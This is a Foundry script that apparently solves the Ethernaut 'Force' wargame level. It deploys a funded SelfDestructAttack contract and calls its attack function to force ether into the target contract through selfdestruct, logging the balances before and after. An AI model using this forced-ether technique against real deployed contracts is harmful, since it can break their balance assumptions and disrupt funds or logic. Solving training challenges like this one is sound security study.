// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {SelfDestructAttack} from "../../../src/ethernaut/07-force/SelfDestructAttack.sol";

contract ForceScript is Script {

    address payable forceInstanceAddress = payable(vm.envAddress("L07_FORCE_INSTANCE"));
    uint256 privateKey = vm.envUint("ACCOUNT_1_PRIVATE_KEY");

    event Balance(address at, uint256 genesisBalance, uint256 finalBalance);

    function run() public {
        vm.startBroadcast(privateKey);

        uint256 genesisBalance = forceInstanceAddress.balance;

        // Step 1: deploy attacker and fund it with ether
        SelfDestructAttack attacker = new SelfDestructAttack{value: 0.000001 ether}(vm.addr(privateKey));

        // Step 2: destroy attacker, incresing force balance
        attacker.attack(forceInstanceAddress);

        uint256 finalBalance = forceInstanceAddress.balance;
        emit Balance(forceInstanceAddress, genesisBalance, finalBalance);

        vm.stopBroadcast();
    }
}